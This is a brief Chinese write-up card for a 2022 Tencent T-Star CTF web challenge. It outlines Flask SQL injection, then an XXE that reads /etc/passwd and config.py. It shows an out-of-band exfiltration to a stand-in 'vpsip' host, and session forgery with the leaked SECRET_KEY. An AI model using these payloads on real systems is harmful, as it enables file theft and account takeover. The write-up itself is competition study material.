---
title: "2022 未知之境 腾讯网络安全 T-Star 高校挑战赛 WriteUp"
category: web
tags: ["2022 腾讯 T-Star 高校挑战赛 (未知之境)", "web", "T-Star", "腾讯", "Flask", "JSON"]
signals: ["2022 腾讯 T-Star 高校挑战赛 (未知之境) 2022", "T-Star", "腾讯", "Flask", "JSON", "id注入", "XXE", "file:///proc/self/cwd/config.py", "error SYSTEM", "sqli", "xxe", "web_unknown", "forensic_disk", "SQLi"]
difficulty: medium
source: "https://www.ctfiot.com/37683.html"
tools: ["Flask", "Python"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 2022 未知之境 腾讯网络安全 T-Star 高校挑战赛 WriteUp

> 赛事：2022 腾讯 T-Star 高校挑战赛 (未知之境) 2022 | 方向：web | 难度：medium | 工具：Flask、Python

## 一句话总结

Flask SQLi + XXE OOB data exfil + Android backup 解包

## 攻击链

1. Q1 Flask: /api/info?id=1 → ''No such streamer'' 提示 SQL 注入
2. POST /api/like json={"id":"1"} 触发 ORM / 拼 SQL
3. Q2 XXE: POST /api/like Content-Type: application/xml
4. <!ENTITY % x SYSTEM 'file:///etc/passwd'>
5. 嵌套 OOB XXE: %x → %y → %z → error SYSTEM ''http://vpsip/?p=%x'' (base64 数据外带)
6. 读 /proc/self/cwd/config.py → SECRET_KEY
7. 伪造 admin session 提权
8. Misc: java -jar abe.jar unpack data.ab data.tar yun202203 (Android backup extract)

## 关键 payload

```
Content-Type: application/xml + OOB XXE to http://vpsip/test.dtd
```

## 经验教训

Flask session 密钥泄露 + XXE OOB 数据外带是 web 中级标配

## 标签

T-Star、腾讯、Flask、JSON、id注入、XXE、file:///proc/self/cwd/config.py、error SYSTEM、abe.jar、data.ab、Android Backup

## 参考来源

- https://www.ctfiot.com/37683.html
- 原文件：2022_未知之境_腾讯网络安全T-Star高校挑战赛_WriteUp.full.md
